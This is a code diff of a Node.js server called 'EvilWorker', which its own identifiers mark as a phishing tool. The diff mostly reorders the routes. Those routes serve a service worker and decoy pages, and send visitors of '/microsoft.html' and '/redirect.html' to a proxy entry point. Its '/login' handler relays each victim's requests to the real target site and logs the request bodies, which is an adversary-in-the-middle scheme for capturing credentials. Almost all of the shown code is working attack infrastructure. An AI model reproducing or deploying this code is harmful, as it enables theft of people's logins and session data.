@@ -61,126 +61,119 @@ function logHTTPProxyTransaction(req, targetUrl, requestBody, responseStatus) {
 
 // Create server
 const server = http.createServer((req, res) => {
-    const parsedUrl = url.parse(req.url, true);
-    const pathname = parsedUrl.pathname;
+  const parsedUrl = url.parse(req.url, true);
+  const pathname = parsedUrl.pathname;
 
-    // 1. SERVE SERVICE WORKER DIRECTLY (BYPASS PROXY)
-if (pathname === '/worker.js') {
-    const filePath = path.join(__dirname, 'worker.js');
-        fs.readFile(filePath, (err, data) => {
-            if (err) {
-                res.writeHead(404);
-                res.end('Service worker not found');
-                return;
-            }
-            res.writeHead(200, { 
-                'Content-Type': 'application/javascript',
-                'Service-Worker-Allowed': '/'
-            });
-            res.end(data);
-        });
-        return;
-    }
-
-// SERVE INDEX FOR ROOT PATH
-if (pathname === '/') {
+  // ===== ROOT PATH - SERVE INDEX HTML FIRST =====
+  if (pathname === '/') {
     const filePath = path.join(__dirname, 'index_smGQUDpT7PN.html');
     fs.readFile(filePath, (err, data) => {
-        if (err) {
-            res.writeHead(302, { 'Location': '/404_not_found_lk48ZVr32WU.html' });
-            res.end();
-            return;
-        }
-        res.writeHead(200, { 'Content-Type': 'text/html' });
-        res.end(data);
-    });
-    return;
-}
-    // 2. SERVE STATIC HTML FILES
-    if (pathname === '/' || pathname === '/index_smGQUDpT7PN.html') {
-        const filePath = path.join(__dirname, 'index_smGQUDpT7PN.html');
-        fs.readFile(filePath, (err, data) => {
-            if (err) {
-                res.writeHead(404);
-                res.end('File not found');
-                return;
-            }
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(data);
-        });
-        return;
-    }
-
-    if (pathname === '/404_not_found_lk48ZVr32WU.html') {
-        const filePath = path.join(__dirname, '404_not_found_lk48ZVr32WU.html');
-        fs.readFile(filePath, (err, data) => {
-            if (err) {
-                res.writeHead(404);
-                res.end('File not found');
-                return;
-            }
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(data);
-        });
-        return;
-    }
-
-    // 3. HANDLE REDIRECT PAGES
-    if (pathname === '/redirect.html' || pathname === '/microsoft.html') {
-        const redirectUrl = `${PROXY_ENTRY_POINT}&${PHISHED_URL_PARAMETER}=${encodeURIComponent(PROXY_TARGET)}`;
-        res.writeHead(302, { 'Location': redirectUrl });
+      if (err) {
+        console.error('Index file not found');
+        res.writeHead(302, { 'Location': '/404_not_found_lk48ZVr32WU.html' });
         res.end();
         return;
-    }
+      }
+      res.writeHead(200, { 'Content-Type': 'text/html' });
+      res.end(data);
+    });
+    return;
+  }
 
-    // 4. HANDLE LOGIN PROXY
-    if (pathname === '/login' && parsedUrl.query[PHISHED_URL_PARAMETER]) {
-        const targetUrl = decodeURIComponent(parsedUrl.query[PHISHED_URL_PARAMETER]);
-        
-        let body = [];
-        req.on('data', chunk => body.push(chunk));
-        req.on('end', () => {
-            body = Buffer.concat(body).toString();
-            
-            // Log the transaction
-            logHTTPProxyTransaction(req, targetUrl, body, null);
-            
-            // Forward request to target
-            const options = url.parse(targetUrl);
-            options.method = req.method;
-            options.headers = req.headers;
-            options.headers.host = options.host;
-            
-            const proxyReq = https.request(options, (proxyRes) => {
-                // Update log with response status
-                logHTTPProxyTransaction(req, targetUrl, body, proxyRes.statusCode);
-                
-                res.writeHead(proxyRes.statusCode, proxyRes.headers);
-                proxyRes.pipe(res);
-            });
-            
-            proxyReq.on('error', (e) => {
-                console.error('Proxy error:', e.message);
-                res.writeHead(502);
-                res.end('Bad Gateway');
-            });
-            
-            if (body) proxyReq.write(body);
-            proxyReq.end();
-        });
+  // 1. SERVE SERVICE WORKER DIRECTLY (BYPASS PROXY)
+  if (pathname === '/worker.js') {
+    const filePath = path.join(__dirname, 'worker.js');
+    fs.readFile(filePath, (err, data) => {
+      if (err) {
+        res.writeHead(404);
+        res.end('Service worker not found');
         return;
-    }
+      }
+      res.writeHead(200, {
+        'Content-Type': 'application/javascript',
+        'Service-Worker-Allowed': '/'
+      });
+      res.end(data);
+    });
+    return;
+  }
 
-    // 5. DEFAULT: REDIRECT TO 404
-    res.writeHead(302, { 'Location': '/404_not_found_lk48ZVr32WU.html' });
+  // 2. SERVE STATIC HTML FILES
+  if (pathname === '/index_smGQUDpT7PN.html') {
+    const filePath = path.join(__dirname, 'index_smGQUDpT7PN.html');
+    fs.readFile(filePath, (err, data) => {
+      if (err) {
+        res.writeHead(404);
+        res.end('File not found');
+        return;
+      }
+      res.writeHead(200, { 'Content-Type': 'text/html' });
+      res.end(data);
+    });
+    return;
+  }
+
+  if (pathname === '/404_not_found_lk48ZVr32WU.html') {
+    const filePath = path.join(__dirname, '404_not_found_lk48ZVr32WU.html');
+    fs.readFile(filePath, (err, data) => {
+      if (err) {
+        res.writeHead(404);
+        res.end('File not found');
+        return;
+      }
+      res.writeHead(200, { 'Content-Type': 'text/html' });
+      res.end(data);
+    });
+    return;
+  }
+
+  // 3. HANDLE REDIRECT PAGES
+  if (pathname === '/redirect.html' || pathname === '/microsoft.html') {
+    const redirectUrl = `${PROXY_ENTRY_POINT}&${PHISHED_URL_PARAMETER}=${encodeURIComponent(PROXY_TARGET)}`;
+    res.writeHead(302, { 'Location': redirectUrl });
     res.end();
-});
+    return;
+  }
 
-// Start server
-server.listen(PHISHING_PORT, () => {
-    console.log(`EvilWorker running on port ${PHISHING_PORT}`);
-});
+  // 4. HANDLE LOGIN PROXY
+  if (pathname === '/login' && parsedUrl.query[PHISHED_URL_PARAMETER]) {
+    const targetUrl = decodeURIComponent(parsedUrl.query[PHISHED_URL_PARAMETER]);
+    
+    let body = [];
+    req.on('data', chunk => body.push(chunk));
+    req.on('end', () => {
+      body = Buffer.concat(body).toString();
+      
+      // Log the transaction
+      logHTTPProxyTransaction(req, targetUrl, body, null);
+      
+      // Forward request to target
+      const options = url.parse(targetUrl);
+      options.method = req.method;
+      options.headers = req.headers;
+      options.headers.host = options.host;
+      
+      const proxyReq = https.request(options, (proxyRes) => {
+        // Update log with response status
+        logHTTPProxyTransaction(req, targetUrl, body, proxyRes.statusCode);
+        
+        res.writeHead(proxyRes.statusCode, proxyRes.headers);
+        proxyRes.pipe(res);
+      });
+      
+      proxyReq.on('error', (e) => {
+        console.error('Proxy error:', e.message);
+        res.writeHead(502);
+        res.end('Bad Gateway');
+      });
+      
+      if (body) proxyReq.write(body);
+      proxyReq.end();
+    });
+    return;
+  }
 
-server.on('error', (e) => {
-    console.error('Server error:', e.message);
+  // 5. DEFAULT: REDIRECT TO 404
+  res.writeHead(302, { 'Location': '/404_not_found_lk48ZVr32WU.html' });
+  res.end();
 });
